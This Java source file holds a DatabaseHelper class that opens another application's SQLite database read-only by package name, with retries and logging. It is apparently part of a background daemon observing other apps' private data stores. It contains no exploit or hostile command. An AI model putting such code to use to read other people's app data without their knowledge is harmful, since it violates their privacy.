package com.vvt.dbobserver;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;

import com.vvt.daemon.util.Customization;
import com.vvt.database.VtDatabaseHelper;
import com.vvt.logger.FxLog;

public class DatabaseHelper {
	
	private static final String TAG = "DatabaseHelper";
	
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGE = Customization.ERROR;
	
	private static  String sPacketName = null;
	private static  String sDatabaseFileName = null;
	
	public static SQLiteDatabase getReadableDatabase(String packetName, String databaseFileName) {
		sPacketName = packetName;
		sDatabaseFileName = databaseFileName;
		if(sPacketName == null || sDatabaseFileName == null){
			if (LOGV) FxLog.v(TAG, "PacketName OR DatabaseFileName is NULL Value");
			return null;
		}
		return openDatabase(SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	
	private static SQLiteDatabase openDatabase(int flags) {
		String realDbPath = null;
		if (realDbPath == null) {
			String dbPath = VtDatabaseHelper.getSystemDatabasePath(sPacketName);
			if (dbPath != null) {
				realDbPath = String.format("%s/%s", dbPath, sDatabaseFileName);
			}
			if (LOGV) FxLog.v(TAG, String.format("openDatabase # sDbPath: %s", realDbPath));
		}
		
		SQLiteDatabase db = tryOpenDatabase(realDbPath,flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if (LOGV) FxLog.v(TAG, "Cannot open database. Retrying ...");
			SystemClock.sleep(1000);
			db = tryOpenDatabase(realDbPath,flags);
			attemptLimit--;
		}
		
		return db;
	}
	
	private static SQLiteDatabase tryOpenDatabase(String realDbPath,int flags) {
		SQLiteDatabase db = null;
		try {
			db = SQLiteDatabase.openDatabase(realDbPath, null, flags);
		}
		catch (SQLiteException e) {
			if (LOGE) FxLog.e(TAG, e.getMessage());
		}
		return db;
	}
}
